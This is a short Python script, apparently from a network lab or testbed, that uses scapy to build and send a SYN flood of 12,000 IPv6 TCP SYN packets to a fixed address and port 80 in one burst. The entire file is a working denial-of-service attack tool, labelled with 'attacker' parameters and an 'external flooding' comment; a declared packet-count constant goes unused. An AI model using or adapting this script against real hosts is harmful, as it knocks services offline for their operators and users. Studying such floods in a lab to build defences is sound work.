import os
import socket
import time
import psutil
from scapy.all import sendp, get_if_hwaddr, conf
from scapy.layers.inet6 import Ether, IPv6, TCP

# Script parameters
ATTACK_PACKET_COUNT = 15000 # Number of packets to send per attacker
INTERFACE = "eth0"
SRC_MAC_ADDRESS = get_if_hwaddr(INTERFACE)
DST_MAC_ADDRESS = "02:01:01:01:00:01"
DST_IP = "2001:db8:1::1"
DST_PORT = 80

# set scapy interface
conf.iface = INTERFACE

def get_ipv6_address(interface_name):
    try:
        # Get all network interfaces and their addresses
        addresses = psutil.net_if_addrs()

        if interface_name not in addresses:
            raise ValueError(f"Interface '{interface_name}' not found.")

        # Iterate over the addresses of the given interface
        for address in addresses[interface_name]:
            if address.family == socket.AF_INET6:  # Check for IPv6 family
                ipv6_address = address.address.split('%')[0]  # Remove zone index if present
                if ipv6_address.startswith("2001"):
                    return ipv6_address

        # If no matching IPv6 address is found
        return None

    except Exception as e:
        print(f"Error: {e}")
        return None


def send_syn_packet():
    # Get the source IPv6 address
    src_address = get_ipv6_address(INTERFACE)

    # Construct the packet
    packets = [
        Ether(src=SRC_MAC_ADDRESS, dst=DST_MAC_ADDRESS) /
        IPv6(src=src_address, dst=DST_IP) /
        TCP(dport=DST_PORT, flags="S", options=[("Timestamp", (3000, 0))]) # external flooding
        for i in range(12000)
    ]

    # Send all packets at once
    sendp(packets, iface=INTERFACE, verbose=False, inter=0)  # `inter=0` ensures immediate sending



if __name__ == "__main__":
    print("Start sending syn flood packets...")
    send_syn_packet()
